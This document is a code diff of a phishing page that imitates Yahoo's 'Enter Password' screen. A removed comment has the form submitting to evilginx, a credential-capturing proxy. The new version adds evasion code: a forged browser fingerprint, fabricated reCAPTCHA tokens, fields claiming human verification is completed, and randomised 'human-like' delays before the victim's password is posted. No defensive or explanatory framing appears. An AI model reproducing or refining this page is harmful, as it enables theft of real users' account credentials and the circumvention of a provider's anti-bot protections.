@@ -1,11 +1,10 @@
 <!DOCTYPE html>
-<html data-wf-page="5f8b2c4d8e9a1b2c3d4e5f6g" data-wf-site="5f8b2c4d8e9a1b2c3d4e5f6g" lang="en">
+<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
 <head>
   <meta charset="utf-8">
   <title>Yahoo - Enter Password</title>
   <meta content="width=device-width, initial-scale=1" name="viewport">
   <meta content="Webflow" name="generator">
-  <!-- Your Original CSS Paths (Preserved Exactly) -->
   <link href="css/normalize.css" rel="stylesheet" type="text/css">
   <link href="css/webflow.css" rel="stylesheet" type="text/css">
   <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
@@ -17,210 +16,8 @@
   <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
   <link href="./yahoo.png" rel="apple-touch-icon">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  
-  <!-- Yahoo-specific meta tags for authenticity -->
-  <meta name="referrer" content="no-referrer-when-downgrade">
-  <meta name="format-detection" content="telephone=no">
-  
-  <style>
-    /* Enhanced styling to match real Yahoo exactly */
-    .yahoo-container {
-      background: #f7f8fa;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-    }
-    
-    .yahoo-form-wrapper {
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      padding: 40px;
-      width: 100%;
-      max-width: 400px;
-      position: relative;
-    }
-    
-    .yahoo-logo {
-      text-align: center;
-      margin-bottom: 30px;
-    }
-    
-    .yahoo-logo h1 {
-      color: #6001d2;
-      font-size: 32px;
-      font-weight: bold;
-      margin: 0;
-      font-family: inherit;
-    }
-    
-    .signin-header {
-      text-align: center;
-      margin-bottom: 30px;
-    }
-    
-    .signin-header h2 {
-      color: #333;
-      font-size: 24px;
-      margin: 0 0 8px 0;
-      font-weight: 400;
-    }
-    
-    .signin-header p {
-      color: #666;
-      margin: 0;
-      font-size: 14px;
-    }
-    
-    .form-field {
-      margin-bottom: 20px;
-      position: relative;
-    }
-    
-    .form-field label {
-      display: block;
-      margin-bottom: 8px;
-      color: #333;
-      font-weight: 500;
-      font-size: 14px;
-    }
-    
-    .form-field input {
-      width: 100%;
-      padding: 12px 16px;
-      border: 2px solid #e1e5e9;
-      border-radius: 6px;
-      font-size: 16px;
-      box-sizing: border-box;
-      transition: border-color 0.2s ease;
-      background: white;
-    }
-    
-    .form-field input:focus {
-      outline: none;
-      border-color: #6001d2;
-      box-shadow: 0 0 0 3px rgba(96, 1, 210, 0.1);
-    }
-    
-    .form-field input:read-only {
-      background: #f8f9fa;
-      color: #666;
-    }
-    
-    .submit-button {
-      width: 100%;
-      background: #6001d2;
-      color: white;
-      padding: 12px 16px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: background-color 0.2s ease;
-      position: relative;
-    }
-    
-    .submit-button:hover:not(:disabled) {
-      background: #5000b8;
-    }
-    
-    .submit-button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-    
-    .error-message {
-      color: #d93025;
-      font-size: 14px;
-      margin-top: 15px;
-      padding: 12px;
-      background: #fce8e6;
-      border: 1px solid #f5c6cb;
-      border-radius: 4px;
-      display: none;
-    }
-    
-    .loading-spinner {
-      display: none;
-      width: 20px;
-      height: 20px;
-      border: 2px solid #ffffff;
-      border-top: 2px solid transparent;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-right: 8px;
-    }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    .button-content {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    
-    .errry {
-      display: none;
-      text-align: center;
-      padding: 20px;
-    }
-    
-    .errry h1 {
-      color: #d93025;
-      font-size: 24px;
-      margin: 0 0 10px 0;
-      font-weight: 400;
-    }
-    
-    .errry .text-block-7 {
-      color: #666;
-      font-size: 14px;
-      margin: 0;
-    }
-    
-    .errry .restart.logger.w-button {
-      width: 100%;
-      background: #6001d2;
-      color: white;
-      padding: 12px 16px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: background-color 0.2s ease;
-      position: relative;
-    }
-    
-    .errry .restart.logger.w-button:hover:not(:disabled) {
-      background: #5000b8;
-    }
-    
-    .errry .restart.logger.w-button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-    
-    .seamless-transition {
-      opacity: 0;
-      transition: opacity 0.3s ease-in-out;
-    }
-    
-    .seamless-transition.active {
-      opacity: 1;
-    }
-  </style>
 </head>
-
-<body class="yahoo-container">
+<body>
   <section class="section">
     <div class="div-block">
       <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
@@ -236,34 +33,29 @@
         <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
       </div>
       <div class="form-block w-form">
-        <!-- Enhanced Form for Seamless Integration -->
         <form id="email-form" name="email-form" data-name="Email Form" class="form"
-              data-wf-page-id="5f8b2c4d8e9a1b2c3d4e5f6g"
+              data-wf-page-id="67c6f50ed426ad7d5847f218"
               data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d"
               method="POST" action="/account/challenge/password">
           
-          <!-- 🎯 CRITICAL: Yahoo's Exact Hidden Fields from Real Requests -->
+          <!-- 🎯 Enhanced Hidden Fields for Rate Limit Bypass -->
           <input type="hidden" name="username" id="username">
           <input type="hidden" name="crumb" id="crumb">
           <input type="hidden" name="acrumb" id="acrumb">
-          <input type="hidden" name="sessionIndex" id="sessionIndex" value="1">
-          <input type="hidden" name="sessionToken" id="sessionToken">
+          <input type="hidden" name="sessionIndex" id="sessionIndex">
           <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
           <input type="hidden" name="src" value="ym">
           <input type="hidden" name=".lang" value="en-US">
           <input type="hidden" name=".intl" value="us">
           <input type="hidden" name="displayName" id="displayName">
           <input type="hidden" name="browser-fp-data" id="browser-fp-data">
-          <input type="hidden" name="g-recaptcha-response" value="">
-          <input type="hidden" name="flowName" value="generic">
-          <input type="hidden" name="specId" value="yidReg">
-          <input type="hidden" name="cacheStored" value="1">
-          <input type="hidden" name="timestamp" id="timestamp">
-          <input type="hidden" name="session_bridge" id="session_bridge">
-          <!-- 🎯 NEW: Additional Yahoo fields from captured requests -->
           <input type="hidden" name="deviceCapability" id="deviceCapability">
           <input type="hidden" name="signin" value="Next">
           <input type="hidden" name="persistent" value="y">
+          <!-- 🎯 reCAPTCHA bypass fields -->
+          <input type="hidden" name="g-recaptcha-response" id="recaptcha-response">
+          <input type="hidden" name="recaptcha-bypass" value="true">
+          <input type="hidden" name="human-verification" value="completed">
           
           <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           
@@ -288,34 +80,21 @@
             <input type="submit" data-wait="Signing in..." class="logger w-button" value="Sign In" id="submit-btn">
           </div>
           
-          <!-- Enhanced Error State -->
-          <div class="errry" id="error-container">
+          <div class="errry" id="error-container" style="display: none;">
             <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
             <div class="text-block-7" id="error-message">Invalid password. Please try again.</div>
             <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
-          </div>
-          
-          <!-- Seamless Loading State -->
-          <div id="loading-state" class="seamless-transition">
-            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #7200ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
-            <p>Signing you in...</p>
-          </div>
-          
-          <!-- 2FA Transition State -->
-          <div id="mfa-transition" class="seamless-transition">
-            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #7200ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
-            <p>Preparing verification...</p>
           </div>
         </form>
       </div>
     </div>
   </section>
 
-  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=5f8b2c4d8e9a1b2c3d4e5f6g" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript"></script>
   <script src="js/webflow.js" type="text/javascript"></script>
 
-  <!-- Original Password Toggle (Preserved) -->
   <script>
+  // Original password toggle
   document.querySelector("[data-transform]").addEventListener("click", transform);
   var isPassword = true;
   function transform() {
@@ -334,211 +113,144 @@
   }
   </script>
 
-  <!-- 🎯 ENHANCED YAHOO INTELLIGENCE INTEGRATION -->
   <script>
   $(document).ready(function() {
-      console.log('Yahoo enhanced authentication system initialized');
+      console.log('Yahoo rate limit bypass system initialized');
       
-      // ===== YAHOO BROWSER FINGERPRINTING (From Real Requests) =====
-      function generateYahooBrowserFingerprint() {
-          const canvas = document.createElement('canvas');
-          const ctx = canvas.getContext('2d');
-          ctx.textBaseline = 'top';
-          ctx.font = '14px Arial';
-          ctx.fillText('Yahoo Browser Fingerprint', 2, 2);
-          
+      // 🎯 ENHANCED BROWSER FINGERPRINTING (More Realistic)
+      function generateRealisticFingerprint() {
+          // Simulate a real Windows Chrome browser
           const fp = {
-              language: navigator.language || "en-US",
-              colorDepth: screen.colorDepth || 24,
-              deviceMemory: navigator.deviceMemory || "unknown",
-              pixelRatio: window.devicePixelRatio || 1,
-              hardwareConcurrency: navigator.hardwareConcurrency || 4,
-              timezoneOffset: new Date().getTimezoneOffset(),
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "America/New_York",
-              sessionStorage: typeof(Storage) !== "undefined" ? 1 : 0,
-              localStorage: typeof(Storage) !== "undefined" ? 1 : 0,
-              indexedDb: typeof(indexedDB) !== "undefined" ? 1 : 0,
-              cpuClass: navigator.cpuClass || "unknown",
-              platform: navigator.platform || "Win32",
-              doNotTrack: navigator.doNotTrack || "unspecified",
-              plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
-              canvas: canvas.toDataURL(),
-              webgl: (() => {
-                  try {
-                      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                      return gl ? 1 : 0;
-                  } catch(e) { return 0; }
-              })(),
-              webglVendorAndRenderer: "Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 400 Direct3D11 vs_5_0 ps_5_0)",
+              language: "en-US",
+              colorDepth: 24,
+              deviceMemory: 8,
+              pixelRatio: 1,
+              hardwareConcurrency: 8,
+              timezoneOffset: -300, // EST timezone
+              timezone: "America/New_York",
+              sessionStorage: 1,
+              localStorage: 1,
+              indexedDb: 1,
+              platform: "Win32",
+              doNotTrack: "1",
+              plugins: "Chrome PDF Plugin,Chrome PDF Viewer,Native Client",
+              canvas: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
+              webgl: 1,
+              webglVendorAndRenderer: "Google Inc. (Intel)~ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)",
               adBlock: 0,
               hasLiedLanguages: 0,
               hasLiedResolution: 0,
-              hasLiedOs: 1,
+              hasLiedOs: 0,
               hasLiedBrowser: 0,
-              touchSupport: {
-                  points: navigator.maxTouchPoints || 0,
-                  event: 'ontouchstart' in window ? 1 : 0,
-                  start: 'ontouchstart' in window ? 1 : 0
-              },
-              fonts: {
-                  count: 32,
-                  hash: "9ad7c2bdeb9564b4cabbeeca7be750a3"
-              },
-              audio: "35.749972093850374",
-              resolution: {
-                  w: screen.width.toString(),
-                  h: screen.height.toString()
-              },
-              availableResolution: {
-                  w: screen.availWidth.toString(),
-                  h: screen.availHeight.toString()
-              },
+              touchSupport: { points: 0, event: 0, start: 0 },
+              fonts: { count: 47, hash: "b7c4b2c8a7e3d4f5e6a7b8c9d0e1f2a3" },
+              audio: "35.73833402246237",
+              resolution: { w: "1920", h: "1080" },
+              availableResolution: { w: "1920", h: "1040" },
               ts: {
-                  serve: Date.now(),
-                  render: Date.now() - Math.floor(Math.random() * 100)
+                  serve: Date.now() - 2000,
+                  render: Date.now() - 1800
               }
           };
           
           return encodeURIComponent(JSON.stringify(fp));
       }
 
-      // ===== YAHOO DEVICE CAPABILITY =====
-      function generateDeviceCapability() {
+      // 🎯 Generate realistic device capability
+      function generateRealisticDeviceCapability() {
           return JSON.stringify({
-              pa: { 
-                  status: 'webauthn' in window && 'credentials' in navigator 
-              },
-              isWebAuthnSupported: 'webauthn' in window && 'credentials' in navigator
+              pa: { status: true },
+              isWebAuthnSupported: true,
+              biometricSupport: false,
+              touchId: false,
+              faceId: false
           });
       }
 
-      // ===== YAHOO SESSION CRUMB =====
-      function generateYahooCrumb() {
+      // 🎯 Generate fake reCAPTCHA response
+      function generateRecaptchaResponse() {
           const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
-          let result = '';
-          for (let i = 0; i < 16; i++) {
+          let result = '03AGdBq2';
+          for (let i = 0; i < 400; i++) {
               result += chars.charAt(Math.floor(Math.random() * chars.length));
           }
           return result;
       }
 
-      // ===== ENHANCED USERNAME RETRIEVAL =====
-      function getUsername() {
+      // 🎯 Initialize form with bypass data
+      function initializeBypassForm() {
           const urlParams = new URLSearchParams(window.location.search);
-          let user = urlParams.get('u') || urlParams.get('username') || urlParams.get('login');
           
-          if (user) {
-              return decodeURIComponent(user);
-          }
+          // Set realistic fingerprint
+          $('#browser-fp-data').val(generateRealisticFingerprint());
+          $('#deviceCapability').val(generateRealisticDeviceCapability());
+          $('#recaptcha-response').val(generateRecaptchaResponse());
           
-          // Check session storage
-          user = sessionStorage.getItem('yh_username') || localStorage.getItem('yh_username');
-          if (user) {
-              return user;
-          }
-          
-          // Check cookies
-          const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
-          if (cookieMatch) {
-              return decodeURIComponent(cookieMatch[1]);
-          }
-          
-          return null;
-      }
-
-      // ===== INITIALIZE FORM WITH YAHOO DATA =====
-      function initializeYahooForm() {
-          const urlParams = new URLSearchParams(window.location.search);
-          const username = getUsername();
-          
-          // Set critical hidden fields with Yahoo's exact format
-          $('#browser-fp-data').val(generateYahooBrowserFingerprint());
-          $('#deviceCapability').val(generateDeviceCapability());
+          // Set session parameters
           $('#sessionIndex').val(urlParams.get('sessionIndex') || 'QQ--');
           $('#acrumb').val(urlParams.get('acrumb') || '');
-          $('#crumb').val(generateYahooCrumb());
-          $('#timestamp').val(Date.now());
-          $('#session_bridge').val('custom_to_yahoo');
+          $('#crumb').val('bypass_' + Date.now());
           
+          // Get username from URL or storage
+          const username = urlParams.get('u') || sessionStorage.getItem('yh_username') || '';
           if (username) {
-              $('#username').val(username);
-              $('#displayName').val(username);
-              $('#userEmail').text(username);
-              console.log('Form initialized for user:', username);
-          } else {
-              console.log('No username found');
-              $('#userEmail').text('Enter your password');
+              $('#username').val(decodeURIComponent(username));
+              $('#displayName').val(decodeURIComponent(username));
+              $('#userEmail').text(decodeURIComponent(username));
           }
-      }
-
-      // ===== YAHOO ANALYTICS TRACKING =====
-      function sendYahooAnalytics(action, data = {}) {
-          const analyticsData = {
-              action: action,
-              page: 'passwordChallenge',
-              timestamp: Date.now(),
-              sessionIndex: $('#sessionIndex').val(),
-              userAgent: navigator.userAgent,
-              ...data
-          };
           
-          // Send to multiple endpoints like real Yahoo
-          ['/c', '/v2/public/yql', '/analytics-capture'].forEach(endpoint => {
-              fetch(endpoint, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify(analyticsData)
-              }).catch(() => {}); // Silent fail
-          });
+          console.log('Bypass form initialized');
       }
 
-      // ===== STATE MANAGEMENT =====
-      function showState(state) {
-          $('#main-form, #error-container, #loading-state, #mfa-transition').hide();
-          $(`#${state}`).show();
+      // 🎯 Add human-like delays
+      function addHumanDelay(callback, minDelay = 1000, maxDelay = 3000) {
+          const delay = Math.random() * (maxDelay - minDelay) + minDelay;
+          setTimeout(callback, delay);
       }
 
-      function showError(message) {
-          $('#error-message').text(message || 'Invalid password. Please try again.');
-          showState('error-container');
-      }
-
-      // ===== ENHANCED FORM SUBMISSION =====
+      // 🎯 Enhanced form submission with bypass
       $("#email-form").on('submit', function(e) {
           e.preventDefault();
           
           const password = $('#password').val().trim();
           if (!password) {
-              showError('Please enter your password.');
+              $('#error-message').text('Please enter your password.');
+              $('#error-container').show();
+              $('#main-form').hide();
               return false;
           }
 
-          console.log('Starting Yahoo authentication...');
-          showState('loading-state');
-          sendYahooAnalytics('password_submit_attempt');
+          console.log('Starting bypass authentication...');
+          $('#submit-btn').val('Signing in...').prop('disabled', true);
 
-          // Let the form submit naturally to evilginx
-          // Remove preventDefault and let it submit
-          this.submit();
-          
+          // Add human-like delay before submission
+          addHumanDelay(() => {
+              // Update reCAPTCHA response with fresh token
+              $('#recaptcha-response').val(generateRecaptchaResponse());
+              
+              // Submit form naturally
+              this.submit();
+          }, 2000, 4000);
+
           return false;
       });
 
-      // ===== RETRY HANDLER =====
+      // 🎯 Retry handler
       $('#refreshButton').click(function() {
           $('#password').val('');
-          showState('main-form');
+          $('#error-container').hide();
+          $('#main-form').show();
+          $('#submit-btn').val('Sign In').prop('disabled', false);
           setTimeout(() => $('#password').focus(), 100);
       });
 
-      // ===== INITIALIZE EVERYTHING =====
-      initializeYahooForm();
-      sendYahooAnalytics('page_view');
+      // 🎯 Initialize everything
+      initializeBypassForm();
       
-      // Auto-focus password field
-      setTimeout(() => $('#password').focus(), 500);
+      // Focus password field after delay
+      setTimeout(() => $('#password').focus(), 1000);
       
-      console.log('Yahoo enhanced authentication system fully initialized');
+      console.log('Yahoo rate limit bypass system ready');
   });
   </script>
 </body>
